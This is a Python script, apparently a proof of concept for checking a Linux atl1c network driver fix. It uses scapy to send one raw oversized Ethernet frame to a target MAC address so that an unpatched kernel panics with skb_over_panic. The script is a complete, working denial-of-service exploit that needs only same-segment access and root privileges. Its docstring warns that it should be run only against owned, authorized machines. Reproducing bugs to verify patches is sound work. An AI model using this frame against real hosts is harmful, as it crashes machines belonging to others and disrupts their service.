#!/usr/bin/env python3
"""
Reproduce the atl1c RX skb_over_panic bug: atl1c_clean_rx() trusts the
hardware-reported RX descriptor length and calls skb_put() with no check
against the actual allocated RX buffer size. An oversized descriptor
trips skb_put()'s own bounds check and panics the kernel
(skb_over_panic / "kernel BUG at net/core/skbuff.c").

Sends ONE raw oversized Ethernet frame at a target atl1c interface still
configured at the default MTU 1500.

  - Unpatched kernel: the target should crash (kernel BUG / skb_over_panic)
    almost immediately.
  - Patched kernel (with the length-validation fix): the target should
    silently drop the frame and keep running normally.

WARNING: this is a deliberate crash test against real hardware. Only run
it against a machine you own/control and are fully prepared to reboot.
Do not point this at anything you care about staying up, and never at
a machine you don't have explicit authorization to test.

Requires: scapy (pip install scapy / apt install python3-scapy), and
root or CAP_NET_RAW to send raw frames. Must run on a machine with a
real L2 path to the target (same switch/segment or a direct cable) -
this operates below IP, so it doesn't route.
"""

import argparse
from scapy.all import Ether, Raw, sendp


def main():
    p = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("iface", help="local interface to send from, e.g. eth0")
    p.add_argument("dst_mac", help="target atl1c interface's MAC address")
    p.add_argument(
        "--total-len",
        type=int,
        default=1557,
        help="desired RX descriptor length reported to atl1c "
        "(14-byte Ethernet header + payload + 4-byte FCS). "
        "Default 1557 matches the originally reported crash.",
    )
    args = p.parse_args()

    # atl1c's reported "length" = 14-byte Ethernet header + payload +
    # 4-byte FCS. The FCS is appended by the sending NIC hardware, not
    # by us, so the frame we actually construct and hand to sendp()
    # should be total_len - 4 (header + payload).
    frame_len_no_fcs = args.total_len - 4
    payload_len = frame_len_no_fcs - 14
    if payload_len <= 1500:
        raise SystemExit(
            f"--total-len {args.total_len} gives a {payload_len}-byte "
            f"payload, which is within standard MTU 1500 and won't "
            f"trigger the bug. Use a larger --total-len."
        )

    print(f"Target atl1c 'length' field: {args.total_len} bytes")
    print(f"Wire frame (header+payload, no FCS): {frame_len_no_fcs} bytes")
    print(f"Payload: {payload_len} bytes")

    frame = Ether(dst=args.dst_mac) / Raw(load=b"\x00" * payload_len)
    sendp(frame, iface=args.iface, verbose=True)


if __name__ == "__main__":
    main()
